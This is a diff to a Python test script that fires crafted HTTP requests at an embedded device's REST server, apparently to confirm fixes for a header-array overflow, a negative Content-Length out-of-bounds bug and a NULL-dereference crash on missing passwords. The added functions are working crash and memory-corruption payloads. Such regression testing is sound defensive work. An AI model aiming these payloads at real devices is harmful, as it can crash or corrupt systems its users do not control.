@@ -105,6 +105,82 @@ def attack_n2(host: str, http_port: int, ftp_port: int, telnet_port: int) -> Non
             pass
 
 
+def attack_h1(host: str, port: int) -> None:
+    """Request with >20 header fields -> overflow of Header.Fields[20] -> wild
+    write past the global http_req[] slot (memory corruption)."""
+    for attempt in range(5):
+        try:
+            s = socket.create_connection((host, port), timeout=4)
+            req = b"GET /v1/version HTTP/1.1\r\nHost: x\r\n"
+            for i in range(40):  # 40 field lines, well over MAX_HEADER_FIELDS (20)
+                req += b"X-H%d: v\r\n" % i
+            req += b"\r\n"
+            s.sendall(req)
+            try:
+                data = s.recv(256)
+                print(f"  attempt {attempt}: sent 40-header request, resp={data[:20]!r}", flush=True)
+            except OSError as e:
+                print(f"  attempt {attempt}: recv failed: {e}", flush=True)
+            s.close()
+        except OSError as e:
+            print(f"  attempt {attempt}: connect/send failed: {e}", flush=True)
+
+
+def attack_h7(host: str, port: int) -> None:
+    """POST with a negative Content-Length -> (int)bodySize negative -> OOB in
+    the body path."""
+    for cl in ("-1", "-1000000", "999999999999"):
+        try:
+            body = b'{"Audio Mixer":{"Vol UltiSid 1":"+1 dB"}}'
+            req = (b"POST /v1/configs HTTP/1.1\r\nHost: x\r\n"
+                   b"Content-Type: application/json\r\n"
+                   b"Content-Length: " + cl.encode() + b"\r\n\r\n" + body)
+            s = socket.create_connection((host, port), timeout=4)
+            s.sendall(req)
+            try:
+                data = s.recv(256)
+                print(f"  Content-Length={cl}: resp={data[:24]!r}", flush=True)
+            except OSError as e:
+                print(f"  Content-Length={cl}: recv failed: {e}", flush=True)
+            s.close()
+        except OSError as e:
+            print(f"  Content-Length={cl}: connect/send failed: {e}", flush=True)
+
+
+def attack_r2(host: str, port: int) -> None:
+    """Set a network password, then hit REST WITHOUT an X-Password header.
+    Before the fix this is strcmp(NULL, password) -> NULL deref crash; after the
+    fix it is a clean auth rejection. The password is transient (reverts on a
+    Nios reset / redeploy)."""
+    import urllib.parse
+    pw = "netbugtest"
+    setpath = ("/v1/configs/" + urllib.parse.quote("Network Settings", safe="") +
+               "/" + urllib.parse.quote("Network Password", safe="") + "?value=" + pw)
+    def req(method, path, hdrs):
+        c = http.client.HTTPConnection(host, port, timeout=4)
+        try:
+            c.request(method, path, headers=hdrs)
+            r = c.getresponse(); r.read()
+            return f"status={r.status}"
+        finally:
+            c.close()
+    try:
+        print(f"  set password: PUT {req('PUT', setpath, {'Connection': 'close'})}", flush=True)
+    except Exception as e:  # noqa: BLE001
+        print(f"  set password raised {type(e).__name__}:{e}", flush=True)
+    try:
+        r = req("GET", "/v1/version", {"Connection": "close"})  # NO X-Password
+        print(f"  no-password request: {r}  (expect 401/403 after fix)", flush=True)
+    except Exception as e:  # noqa: BLE001
+        print(f"  no-password request raised {type(e).__name__}:{e}  (=> crash, before fix)", flush=True)
+    try:
+        r = req("GET", "/v1/version", {"Connection": "close", "X-Password": pw})
+        print(f"  with-password request: {r}  (expect 200 after fix)", flush=True)
+    except Exception as e:  # noqa: BLE001
+        print(f"  with-password request raised {type(e).__name__}:{e}", flush=True)
+    print("  NOTE: password is set in RAM config; redeploy (Nios reset) to clear it.", flush=True)
+
+
 def attack_r1(host: str, port: int) -> None:
     """Oversized REST error string -> vsprintf into char msg[200] on the HTTP task."""
     long_name = "A" * 400
@@ -138,12 +214,18 @@ def main(argv: list[str]) -> int:
     ap.add_argument("--http-port", type=int, default=80)
     ap.add_argument("--ftp-port", type=int, default=21)
     ap.add_argument("--telnet-port", type=int, default=23)
-    ap.add_argument("--attack", required=True, choices=("h2", "h5", "n2", "r1"))
+    ap.add_argument("--attack", required=True, choices=("h1", "h2", "h5", "h7", "n2", "r1", "r2"))
     args = ap.parse_args(argv)
 
     print(f"=== attack {args.attack} on {args.host} ===", flush=True)
     print(f"  health BEFORE = {health(args.host, args.http_port)}", flush=True)
-    if args.attack == "h2":
+    if args.attack == "h1":
+        attack_h1(args.host, args.http_port)
+    elif args.attack == "r2":
+        attack_r2(args.host, args.http_port)
+    elif args.attack == "h7":
+        attack_h7(args.host, args.http_port)
+    elif args.attack == "h2":
         attack_h2(args.host, args.http_port)
     elif args.attack == "h5":
         attack_h5(args.host, args.http_port)
